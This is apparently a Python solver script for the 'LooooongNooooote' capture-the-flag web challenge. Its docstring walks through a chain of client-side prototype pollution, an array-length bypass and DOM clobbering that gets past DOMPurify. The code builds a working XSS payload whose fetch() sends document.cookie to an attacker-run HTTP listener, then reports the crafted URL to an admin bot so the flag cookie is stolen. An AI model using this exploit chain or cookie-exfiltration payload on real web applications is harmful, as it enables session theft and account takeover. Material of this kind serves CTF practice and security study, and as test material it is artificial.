"""
Solver for LooooongNooooote.

Vulnerability (documented in README.md): CSPP (client-side prototype
pollution) + a `length` bypass via an array "slice overflow" + DOM
Clobbering to bypass DOMPurify -> XSS.

`views/index.ejs` parses the page's own query string with `query-string`
(`arrayFormat: 'bracket'`) and does:

    notes[username] = { [noteName]: noteContent };

With `username=__proto__` and `noteName=uuid`, this replaces the
`[[Prototype]]` of the local `notes` object with `{ uuid: noteContent }`,
so any later `notes["uuid"]` lookup resolves through the prototype chain to
whatever we supplied as `noteContent` -- a client-side prototype pollution
primitive scoped to that one object.

If `noteContent` is submitted as a bracketed array (`noteContent[]=...`)
with exactly 36 elements, `GenerateCustomUUID()`'s `notes["uuid"].length !=
36` guard passes (the "array slice overflow" / length bypass from the
TLDR), and it returns `` `${notes["uuid"][24]}${custom_id}` `` -- i.e. our
array element at index 24 (the 25th `noteContent[]` value) verbatim,
prefixed into a string.

That string is then rendered via:

    previewUserID.innerHTML = DOMPurify.sanitize(payload, { SANITIZE_DOM: false, ... });

`SANITIZE_DOM: false` tells DOMPurify to skip its anti-DOM-clobbering
checks, so our `<a id="debug">` elements survive sanitization and get
inserted into the live document. Two elements sharing `id="debug"` clobber
`window.debug` into an `HTMLCollection`; the second element also carries
`name="timeout"`, so `debug.timeout` resolves (by named-item lookup) to
that `<a>` node. `debug.js`'s `timeout()` then runs:

    setTimeout(debug.timeout, 500)

`debug.timeout` is not a function but an `HTMLAnchorElement`, which
stringifies to its resolved `href` (`HTMLHyperlinkElementUtils`'
stringifier). Per the `TimerHandler` WebIDL union, a non-callable handler
is converted to a `DOMString` and `eval`'d. Our href is
`cid:fetch(...)`; `cid:` parses as a harmless statement label, so the
`fetch(...)` call executes with full access to `document.cookie`, letting
us exfiltrate the admin's flag cookie to a listener we control.

This script reuses the exact payload generator and query layout from the
README verbatim (36 `noteContent[]` entries, payload at index 24), only
substituting our own listener's URL for the exfiltration target, following
the same "run our own tiny HTTP server, report a same-origin exploit URL to
the bot, then read the leaked cookie" shape as the working `cross`
solution.
"""

import os
import re
import socket
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

LISTENER_PORT = 8080
# The bot (bot.js) only navigates to URLs that are same-origin with its own
# `DOMAIN` env (defaulting to http://localhost:7777), and it runs inside the
# very same container as the app -- so the exploit URL we hand it must be
# the *internal* localhost address, not the externally exposed endpoint.
INTERNAL_APP_ORIGIN = "http://localhost:7777"


def own_reachable_ip(target_host: str, target_port: int) -> str:
    """The IP by which `target_host` (and, symmetrically, our own listener) is reachable."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_host, target_port))
        return s.getsockname()[0]
    finally:
        s.close()


class Listener:
    """Receives the exfiltrated `document.cookie` value from the admin bot's browser."""

    def __init__(self):
        self.cookie = None
        self.received = threading.Event()
        owner = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                print(f"[listener] {self.address_string()} - {fmt % args}", file=sys.stderr)

            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == "/exfil":
                    qs = urllib.parse.parse_qs(parsed.query)
                    cookie = qs.get("c", [""])[0]
                    print(f"[listener] exfil received: {cookie!r}")
                    owner.cookie = cookie
                    owner.received.set()
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()

        self.server = ThreadingHTTPServer(("0.0.0.0", LISTENER_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def wait_for_exfil(self, timeout: float) -> str:
        if not self.received.wait(timeout):
            raise TimeoutError("did not receive the exfiltrated cookie in time")
        return self.cookie

    def stop(self):
        self.server.shutdown()


def build_payload(listener_url: str) -> str:
    # Verbatim shape from the README's documented payload, only the
    # exfiltration sink is swapped for our own listener.
    sink = f"{listener_url}/exfil"
    return (
        '<a id="debug"></a><a id="debug" name="timeout" href="cid:fetch('
        f"`{sink}?c=${{encodeURIComponent(document.cookie)}}`"
        ')"></a>'
    )


def build_exploit_query(payload: str) -> str:
    # Reimplements the README's generator loop exactly: 36 total
    # `noteContent[]` entries, with the payload substituted in for the
    # i == 23 iteration (array index 24, the "array slice overflow" length
    # bypass target read by `GenerateCustomUUID()`).
    encoded_payload = urllib.parse.quote(payload, safe="")
    parts = ["noteContent[]=A"]
    for i in range(36):
        if i == 34:
            parts.append("noteContent[]=A")
            break
        if i == 23:
            parts.append(f"noteContent[]={encoded_payload}")
        else:
            parts.append("noteContent[]=A")
    note_content = "&".join(parts)
    assert len(parts) == 36, f"expected 36 noteContent[] entries, got {len(parts)}"
    return f"username=__proto__&noteName=uuid&{note_content}&previewNote=1"


def exploit(app_endpoint: str):
    host_port = app_endpoint.split("://", 1)[1]
    host, _, port_str = host_port.partition(":")
    port = int(port_str) if port_str else 80

    my_ip = own_reachable_ip(host, port)
    print(f"[*] Our listener is reachable at {my_ip}:{LISTENER_PORT}")

    listener = Listener()
    listener.start()

    listener_url = f"http://{my_ip}:{LISTENER_PORT}"
    payload = build_payload(listener_url)
    query = build_exploit_query(payload)
    exploit_url = f"{INTERNAL_APP_ORIGIN}/?{query}"
    print(f"[*] Crafted exploit URL: {exploit_url}")

    r = requests.post(f"{app_endpoint}/checkNote", data={"noteUrl": exploit_url}, timeout=15)
    assert r.ok, f"reporting the URL failed: {r.status_code} {r.text}"
    print("[*] Reported URL to the admin bot")

    cookie = listener.wait_for_exfil(timeout=60)
    listener.stop()

    decoded = urllib.parse.unquote(cookie)
    print(f"[*] Exfiltrated cookie: {decoded!r}")
    match = re.search(r"flag=([^;]+)", decoded)
    assert match, f"exfiltrated cookie did not contain the flag cookie: {decoded!r}"
    flag = match.group(1)
    print(f"[*] Flag: {flag}")


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SERVICE_APP_MAIN_ENDPOINT")
    assert endpoint, "usage: solve.py <app base url>"
    exploit(endpoint)
